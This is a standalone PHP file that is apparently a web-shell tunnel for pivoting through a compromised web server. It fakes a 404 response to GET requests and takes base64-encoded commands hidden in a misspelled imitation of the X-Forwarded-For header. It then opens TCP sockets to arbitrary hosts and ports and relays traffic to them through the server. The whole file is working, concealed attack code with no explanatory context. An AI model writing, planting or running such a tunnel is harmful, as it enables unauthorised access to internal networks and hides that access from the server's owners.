<?php

ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set("php_sockets.dll", true);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    http_response_code(404);
    die(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
	$cmd =  explode(",", base64_decode($headers["X-F0RWARDED-F0R"]));
    switch($cmd[0]){

        case "check":
        {
            header('SESSIONID: VEhBTksgR09EIE5RIA');
            return;
        }
        break;
		case "connect":
		{
			$target = $cmd[1];
			$port = (int)$cmd[2];
			$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			if ($sock === false)
			{
				header('X-STATUS: FAIL');
				header('X-ERROR: Failed creating socket');
				return;
			}
			$res = @socket_connect($sock, $target, $port);
            if ($res === false)
			{
				header('X-STATUS: FAIL');
				header('X-ERROR: Failed connecting to target');
				return;
			}
			socket_set_nonblock($sock);
			@session_start();
			$_SESSION["run"] = true;
            $_SESSION["writebuf"] = "";
            $_SESSION["readbuf"] = "";
            ob_end_clean();
            header('X-STATUS: OK');
            header("Connection: close");
            ignore_user_abort();
            ob_start();
            $size = ob_get_length();
            header("Content-Length: $size");
            ob_end_flush();
            flush();
			session_write_close();

			while ($_SESSION["run"])
			{
				$readBuff = "";
				@session_start();
				$writeBuff = $_SESSION["writebuf"];
				$_SESSION["writebuf"] = "";
				session_write_close();
                if ($writeBuff != "")
				{
					$i = socket_write($sock, $writeBuff, strlen($writeBuff));
					if($i === false)
					{
						@session_start();
                        $_SESSION["run"] = false;
                        session_write_close();
                        header('X-STATUS: FAIL');
						header('X-ERROR: Failed writing socket');
					}
				}
				while ($o = socket_read($sock, 512)) {
				if($o === false)
					{
                        @session_start();
                        $_SESSION["run"] = false;
                        session_write_close();
						header('X-STATUS: FAIL');
						header('X-ERROR: Failed reading from socket');
					}
					$readBuff .= $o;
				}
                if ($readBuff!=""){
                    @session_start();
                    $_SESSION["readbuf"] .= $readBuff;
                    session_write_close();
                }
                #sleep(0.2);
			}
            socket_close($sock);
		}
		break;
		case "disconnect":
		{
            error_log("DISCONNECT recieved");
			@session_start();
			$_SESSION["run"] = false;
			session_write_close();
			return;
		}
		break;
		case "read":
		{
			@session_start();
			$readBuffer = $_SESSION["readbuf"];
            $_SESSION["readbuf"]="";
            $running = $_SESSION["run"];
			session_write_close();
            if ($running) {
				header('X-STATUS: OK');
                header("Connection: Keep-Alive");
				echo $readBuffer;
				return;
			} else {
                header('X-STATUS: FAIL');
                header('X-ERROR: RemoteSocket read filed');
				return;
			}
		}
		break;
		case "forward":
		{
            @session_start();
            $running = $_SESSION["run"];
			session_write_close();
            if(!$running){
                header('X-STATUS: FAIL');
				header('X-ERROR: No more running, close now');
                return;
            }
            header('Content-Type: application/octet-stream');
			$rawPostData = file_get_contents("php://input");
			if ($rawPostData) {
				@session_start();
				$_SESSION["writebuf"] .= $rawPostData;
				session_write_close();
				header('X-STATUS: OK');
                header("Connection: Keep-Alive");
				return;
			} else {
				header('X-STATUS: FAIL');
				header('X-ERROR: POST request read filed');
			}
		}
		break;
	}
}
?>
